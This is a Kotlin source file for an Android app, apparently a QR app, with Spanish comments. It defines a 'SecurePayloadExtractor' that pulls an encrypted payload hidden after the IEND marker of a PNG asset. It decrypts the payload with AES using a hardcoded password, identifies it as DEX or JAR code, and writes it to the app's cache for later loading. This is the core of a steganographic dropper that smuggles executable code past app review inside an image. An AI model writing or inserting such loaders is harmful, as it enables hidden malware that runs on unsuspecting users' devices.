package com.example.aplicacionqr

import android.content.Context
import android.util.Log
import java.io.File
import java.io.FileOutputStream
import javax.crypto.Cipher
import javax.crypto.SecretKeyFactory
import javax.crypto.spec.IvParameterSpec
import javax.crypto.spec.PBEKeySpec
import javax.crypto.spec.SecretKeySpec

data class ExtractedPayload(
    val type: String,
    val file: File,
    val sizeBytes: Long
)

object SecurePayloadExtractor {

    private const val TAG = "SecurePayloadExtractor"
    private const val PASSWORD = "MiPasswordSegura2025"  // ⚠️ Debe coincidir con el script
    private const val PBKDF2_ITERATIONS = 10000

    fun extractFromAssets(context: Context, assetName: String): ExtractedPayload? {
        Log.d(TAG, "🔍 Iniciando extracción de: $assetName")

        return try {
            val imageBytes = context.assets.open(assetName).use { it.readBytes() }
            Log.d(TAG, "📁 Imagen cargada: ${imageBytes.size} bytes")

            val pngEndOffset = findPNGEndMarker(imageBytes)
            if (pngEndOffset == -1) {
                Log.e(TAG, "❌ No se encontró marcador PNG IEND")
                return null
            }
            Log.d(TAG, "✅ PNG termina en offset: $pngEndOffset")

            val encryptedPayload = imageBytes.sliceArray((pngEndOffset + 8) until imageBytes.size)

            if (encryptedPayload.isEmpty()) {
                Log.e(TAG, "❌ No hay datos después del PNG")
                return null
            }
            Log.d(TAG, "🔐 Payload encriptado encontrado: ${encryptedPayload.size} bytes")

            val decryptedPayload = decryptOpenSSLFormat(encryptedPayload, PASSWORD)
            Log.d(TAG, "✅ Payload desencriptado: ${decryptedPayload.size} bytes")

            val fileType = detectPayloadType(decryptedPayload)
            val extension = when (fileType) {
                "dex" -> "dex"
                "jar" -> "jar"
                "apk" -> "apk"
                else -> "bin"
            }
            Log.d(TAG, "📦 Tipo detectado: $fileType")

            // Usar timestamp para evitar conflictos
            val timestamp = System.currentTimeMillis()
            val outputFile = File(context.cacheDir, "payload_${timestamp}.$extension")

            // Eliminar archivo anterior si existe
            if (outputFile.exists()) {
                outputFile.delete()
            }

            Log.d(TAG, "💾 Guardando en: ${outputFile.absolutePath}")

            FileOutputStream(outputFile).use { it.write(decryptedPayload) }

            if (!outputFile.exists()) {
                Log.e(TAG, "❌ El archivo no se creó")
                return null
            }

            Log.d(TAG, "✅ Archivo guardado: ${outputFile.length()} bytes")

            // Configurar permisos: SOLO LECTURA
            outputFile.setWritable(false, false)
            outputFile.setReadable(true, false)
            outputFile.setExecutable(false, false)

            Log.d(TAG, "🔒 Permisos: W=${outputFile.canWrite()} R=${outputFile.canRead()}")

            ExtractedPayload(
                type = fileType,
                file = outputFile,
                sizeBytes = decryptedPayload.size.toLong()
            )

        } catch (e: Exception) {
            Log.e(TAG, "❌ Error: ${e.message}", e)
            null
        }
    }

    private fun findPNGEndMarker(data: ByteArray): Int {
        val iendMarker = byteArrayOf(
            0x49, 0x45, 0x4E, 0x44,
            0xAE.toByte(), 0x42, 0x60.toByte(), 0x82.toByte()
        )

        for (i in 0..(data.size - iendMarker.size)) {
            var found = true
            for (j in iendMarker.indices) {
                if (data[i + j] != iendMarker[j]) {
                    found = false
                    break
                }
            }
            if (found) return i
        }
        return -1
    }

    private fun decryptOpenSSLFormat(encryptedData: ByteArray, password: String): ByteArray {
        val saltedHeader = "Salted__".toByteArray(Charsets.US_ASCII)

        if (encryptedData.size < 16) {
            throw IllegalArgumentException("Datos muy cortos")
        }

        val header = encryptedData.sliceArray(0 until 8)
        if (!header.contentEquals(saltedHeader)) {
            throw IllegalArgumentException("Formato OpenSSL inválido")
        }

        val salt = encryptedData.sliceArray(8 until 16)
        Log.d(TAG, "🧂 Salt: ${salt.joinToString("") { "%02x".format(it) }}")

        val ciphertext = encryptedData.sliceArray(16 until encryptedData.size)

        val factory = SecretKeyFactory.getInstance("PBKDF2WithHmacSHA256")
        val spec = PBEKeySpec(password.toCharArray(), salt, PBKDF2_ITERATIONS, 48 * 8)
        val derivedKeyIv = factory.generateSecret(spec).encoded

        val keyBytes = derivedKeyIv.sliceArray(0 until 32)
        val ivBytes = derivedKeyIv.sliceArray(32 until 48)

        Log.d(TAG, "🔑 Clave: ${keyBytes.size} bytes, IV: ${ivBytes.size} bytes")

        val cipher = Cipher.getInstance("AES/CBC/PKCS5Padding")
        val secretKey = SecretKeySpec(keyBytes, "AES")
        val iv = IvParameterSpec(ivBytes)

        cipher.init(Cipher.DECRYPT_MODE, secretKey, iv)
        return cipher.doFinal(ciphertext)
    }

    private fun detectPayloadType(data: ByteArray): String {
        if (data.size < 8) return "unknown"

        // DEX: "dex\n" + versión (035, 036, 037, etc.)
        if (data[0] == 0x64.toByte() &&  // 'd'
            data[1] == 0x65.toByte() &&  // 'e'
            data[2] == 0x78.toByte() &&  // 'x'
            data[3] == 0x0A.toByte()) {  // '\n'

            val version = data.sliceArray(4 until 8).toString(Charsets.US_ASCII)
            Log.d(TAG, "✅ DEX version: $version")
            return "dex"
        }

        // JAR/ZIP: PK\x03\x04
        if (data[0] == 0x50.toByte() &&
            data[1] == 0x4B.toByte() &&
            data[2] == 0x03.toByte() &&
            data[3] == 0x04.toByte()) {
            return "jar"
        }

        Log.w(TAG, "⚠️ Tipo desconocido")
        Log.d(TAG, "Primeros bytes: ${data.take(16).joinToString(" ") { "%02x".format(it) }}")
        return "unknown"
    }
}